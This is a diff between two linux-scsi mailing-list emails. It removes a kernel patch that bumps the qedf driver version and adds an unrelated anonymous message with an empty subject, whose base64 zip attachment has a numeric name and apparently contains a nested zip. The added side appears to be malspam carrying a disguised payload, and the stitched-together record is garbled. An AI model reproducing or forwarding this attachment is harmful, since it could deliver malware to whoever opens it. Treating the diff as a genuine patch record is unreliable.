@@ -1,43 +1,71 @@
-From: Chad Dupuis <chad.dupuis@cavium.com>
-Subject: [PATCH 6/6] qedf: Update driver version to 8.20.5.0.
-Date: Tue, 15 Aug 2017 10:08:21 -0700
-Message-ID: <20170815170821.20806-7-chad.dupuis@cavium.com>
-References: <20170815170821.20806-1-chad.dupuis@cavium.com>
+From: <nnarroyo623@hotmail.com>
+Subject: (unknown)
+Date: Tue, 15 Aug 2017 17:31:58 -0000
+Message-ID: <150281831899.2727.17356998556358550941@surnet.ru>
 Mime-Version: 1.0
-Content-Type: text/plain
+Content-Type: application/zip; name="035925974243079.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-scsi-owner@vger.kernel.org>
-Received: from mail-by2nam03on0089.outbound.protection.outlook.com ([104.47.42.89]:55734
-        "EHLO NAM03-BY2-obe.outbound.protection.outlook.com"
-        rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with ESMTP
-        id S1752609AbdHORJb (ORCPT <rfc822;linux-scsi@vger.kernel.org>);
-        Tue, 15 Aug 2017 13:09:31 -0400
-In-Reply-To: <20170815170821.20806-1-chad.dupuis@cavium.com>
+Received: from ip-178-46-164-145.dsl.surnet.ru ([178.46.164.145]:46031 "HELO
+        surnet.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1752992AbdHORcC (ORCPT <rfc822;linux-scsi@vger.kernel.org>);
+        Tue, 15 Aug 2017 13:32:02 -0400
+Subject: 
+Content-Disposition: attachment
 Sender: linux-scsi-owner@vger.kernel.org
 List-Id: linux-scsi@vger.kernel.org
-To: martin.petersen@oracle.com
-Cc: linux-scsi@vger.kernel.org, james.bottomley@hansenpartnership.com, QLogic-Storage-Upstream@cavium.com
+To: linux-scsi@vger.kernel.org
 
-Signed-off-by: Chad Dupuis <chad.dupuis@cavium.com>
----
- drivers/scsi/qedf/qedf_version.h | 6 +++---
- 1 file changed, 3 insertions(+), 3 deletions(-)
-
-diff --git a/drivers/scsi/qedf/qedf_version.h b/drivers/scsi/qedf/qedf_version.h
-index 6fa442061c32..397b3b8ee51a 100644
---- a/drivers/scsi/qedf/qedf_version.h
-+++ b/drivers/scsi/qedf/qedf_version.h
-@@ -7,9 +7,9 @@
-  *  this source tree.
-  */
- 
--#define QEDF_VERSION		"8.18.22.0"
-+#define QEDF_VERSION		"8.20.5.0"
- #define QEDF_DRIVER_MAJOR_VER		8
--#define QEDF_DRIVER_MINOR_VER		18
--#define QEDF_DRIVER_REV_VER		22
-+#define QEDF_DRIVER_MINOR_VER		20
-+#define QEDF_DRIVER_REV_VER		5
- #define QEDF_DRIVER_ENG_VER		0
- 
--- 
-2.12.3
+UEsDBBQDAAAIAJlqD0swEMKoAgsAAEILAAAOAAAAODQ3NDYxNTA4Mi56aXCtVlc0GwoATaSoVTGf
+TWuVRm2lRmxaK/YeiU1QtWvGbr3aL61aNYraW1RaqnZ5aFSNSqzYW80Kb/29c97fu/fjnnvuPef+
+Xpge6BozCAC4DsjxotcbW7weWUwNAFhKAQB0AABAWkbBXCHI3yPY4q5XwLZNeMCiHPhKMX8wBJbz
++5TMRMhgS/76m3VZIGMmjE+VpzSN3fnz1LwlZDb++9go/jcIP/yRcOQyVIrdc1yl2YbU3Mpqoqxu
+NNmeapietrqmtP98iirC3N9+yRXM4CdTefMKGxUu3bmbS3qduDES/M6jlZcnVzb7h+r1b+mXB4FP
+ZvfucjykM48vY42fskzoVhOKrmcUf9ka+GJ+QzITAt7K9TrCmCjj2zB+un6teb4VtW/vt2nze1mv
+J1iSsGmLHvthvOXvqizWyBIo6/WJ6graEkP55fwjSE3Ikia7KNKwpy8BqqRfPq/7jPfdkogcouXg
+8/zCi+MMCgNv+S1JZVazIwJ5xroiqwlRvudJHjjwcWwqvrOueJQPdYtLOENczN5izZmRQuWjO6rd
+Sou1Gc1WwRgE9Z/juCYOHCeq2HA8QU7p9hoza361XIsZunxcqA15Rkmi07XXwo8drAjse3tMsCn/
+nhV14n8j3bhHuEbvJogtPTExJd0XtyCZqbPLL9xXWd9ei6NJ1nAnf3/ST40pC9zL46O8jLyTrKSs
+8UVeF+EiYBxPYltgtikuqgJMVnTceEpFXcIXpP9rRCX3rHG6PnJ5/ZIsJ9UVXrYKx417e1QzIW/V
+36e/tSa2jPLvoBDiggZfUMGAyJKUgdieKf7XDOTvPNcElhC/dDGTf3Dm49/DXru+Isj36R4D0gnQ
+95FyS/P2S1CC2jjNBfl1sEwIgpcplipfgcz27V106VZ0w1WCCWXVhDr4PoUamLxVFHwj7nYZSvL7
+NfT9byUcr66JpEbQN7+drWWKo8Z4CLUbyU3aW3EfUcKhQcUxes78eyA/YJVesob90AUlTypiDm6S
+0z8V5FnX35ryMWoFkgwVNJSx5dsT32fKXNvxcr9r4TD+XNJOeVZnDPWAzkmNz5gZokquAreqiUOt
+bwR4OJNyoq5nNdBkES85M5YU6me7Go6YSyT7VKSy9tlyrUOTQWg4VaJGeUKyc/KqpI1ryWU+3tTV
+o1D8blXhtIhHP3eXI7F53CfPk0XO5Y2Eej89zBWsY3Ui+jMcYiqSLQbGyuKsPH9DsTeAynyhsEdg
+VVUVWpDVlIR8iF11bIBs4DWhScENX1UJLkX/vukMlcQlrI3HDJKO15cLZ+HnftqHjYhQSYMXhds5
+0A4pwEfU3+PsD6eDt60LauFuDBR7jJPQhudrO5luINffGLUeiW/yNYqdIklmNqSDRkNuzbUowCxX
+nw2uHmSu0Gkfuk8chmGWTapftWsKT+vmrAWoVaafjU3GiyDQlHDl0AonUwnP5VBtFiCSrtZxYjUw
++6XYT+qJpq5xD/nTA7m8saScOa/RIzdIy01vaONx/oShFWeDXPpMdotV4+um4GEby0WvTH2BB6/s
+tIe1rHIfRWtyPrKH62RhWjWjETW9M0yTPA8PymTCqz0E4rPfiG6VmHwtQ4FGC2m1zjY1WBs4bHyG
+f+wMKu6mGzdjUBB/7XfPJ16N62zzkONfnA2c1xJzb3rTbLmMDe7N8FPsiCciUz4gzfrbSJuYsSTs
+1cDPkAQV4vtP4VknL0+Au1S7QfiOhDAZfDh5JLSwzklY5PQX1pWUZ8c0j4MXDoXxtljoAgmuRoBU
+ayAhvFaEmS2jLYm006pWq9t+yNaLk418R3ZmPzsIiSDnVrL5dhAGhuKz8LwvyrMW9OzUkxhJxsWE
+38beaioy+jyUQa+pFj/V3GTcRp+WPWi2RBAIewEBtaUu7+FPC8fvXGQEbWfuGzH6PPjxVJMXPXVP
+DyEIFqWjzq6NaUB95WK7AlfX9W51xvseC7s3aEczNm+601DMb/qe91s2VGZ1GP4PcwAIHRoUyjSg
+oHrJnX4lWXx1pzmFjfD5yw/XqdSRVQtGB4nXbR2HTsehkScByviHibEXtwdCbAfN0lP5DNQQahSx
+ArET5Ou+QTpMpW1fazt3pleYBydbEmyVUx5GTpk1taVGMZYKDjCp8fi2ePvSPVWtZwtnibn3GlI0
+Dy0+I8SeR3e30u5/O233MfGfCyO6/AwPJ+p7LRZurDzMbeS8FWs9L3YiXRxqOmvbccvtE1/rs9ii
+jh2re262Q/aLwZO0PLsjy1iV96bhprvVettfkAdSHL8uUghkOr6eKNKC0VEptVT2ApkBr50+JqQd
+5sq8oBQmDsXUOgYHdXj61am6/R4n+Rx/QFndlb0venGMPTjYOD+rLrkPut39HcHpKlEqfS3NcwIj
+l8Uj1grk5YahlvLm4m1mhmi2yfrjwJypOwWUtU/5jyqoD7rjzR4ADNqp699N4nKmvxaOqq6WEjMJ
+UVXVQq5FqI+7hBK/saQTid4T2cATdXBNXDdbc+BeRSKPTfk9fhs7oKTQMBt0YgyLeh8WaiDmjQMb
+PV5COMrdu/sLnIEMpW/CP/iyJ4P6cPXwY/Eh1SRZCwNRXR4W5i+rOGatBW+/Y7szhL5ynzaJSJIK
+7xP7+rK3XHZZGdvTJmNdw9v/Oz+VTgi9rIwsb19WYCbHD3vdT9sY9vZRqyLwSEKrm+AbpTv7P5+g
+8Ri6Gp54GtGBueIaio6tDQqLs+kac9FHy/E6saNYRAR6rydsCF1ea236UvZN2e3ZGpFhjiUcNq/Q
+ggV3e7sGgksC1jdlDXkFVJ1W/h4RAa26GYxdnwVGn6csGVYVtWfDOGcKcK9KvZ/lViJLKu4sY08y
+N11SWHME2+pdPlXbW4Q5TEfebPwM8cu2LjCQatp0CMCbjGaCFcUAAQGBClFrYefZ3ZZYHO1q0wdT
+o6QjzlfWN8AvoDF1lgIFk0YRQa6o/J25OH9Kwr1YPx3CjdnO/qMbmYq6H9gF6gqZ+mdTh7Y9yCE7
+XRjQUm7MfjHLBhVkYcKMM6UqBc4JG3BMahrtbBRNIlKolVZ6s6TVSQNHei8FWqu+EkIeBCTh2ro9
+l+VGjHXeh3HYfRd/4hzsP6vo/Qxo4aixuJEw47A1V1HDLuluNFdlcyn3yv5sMpp3IMqcYgbZZGbR
+gdAYIyXf8Ix+BNNS939MKO2sHzbgAcWRVIlGQ2NchJ5Rez3zNR/rt25MXzpbqOiJfhjpJri4DOcv
+cWydyINVue+lGaKaXU38K0xsq9+iGyz8gQYOd3l2d40KK3vV/fclmxmVyoQOO96cMknzcrnkjWRu
+s0UBZEvOkRKrruuakAKtJy9EgnMWfaTIq4ri6xNpD7ZsdwadlXbHuwMsdgszKrLwBfujtGl2gUFl
+KGFljmhz+WQDMvNSep2eZn1EDiupYTPJr/Pn8aeQ7FiElFzNVOkPdHHU5W89XYnylpX6J6CysmyC
+tfWz8PnN8+Hj74MGKUI3P9ZLxvMkNg73oTFDXnaFsreiaxKHAYOORsbBboZ5LrWhK0fl1Vsqx31G
+2w6r56mXTn5pBZ7oRTbo5w9nqNH2z98npUYtIJGPvx2QrJuGA5wHM+WNekBSo0MMCvpQ7g9JnbsY
+WyXux963WFTo79MyCkZfMHzqweS7omlToMXDoWMsKRdOEZYrBGJr22efLzSjT9ZroAnStgMS1nMR
+JRJtOTnnuA3tBF9S74Y4TA9IBgX9150VAPwDvphSFODf55YawPd3CASwAWJ8n09usOCA/1aYHjnF
+350/6finjlD/5f4AUEsBAj8DFAMAAAgAmWoPSzAQwqgCCwAAQgsAAA4AJAAAAAAAAAAggKSBAAAA
+ADg0NzQ2MTUwODIuemlwCgAgAAAAAAABABgAAAUm1+oV0wEABSbX6hXTAQAFJtfqFdMBUEsFBgAA
+AAABAAEAYAAAAC4LAAAAAA==
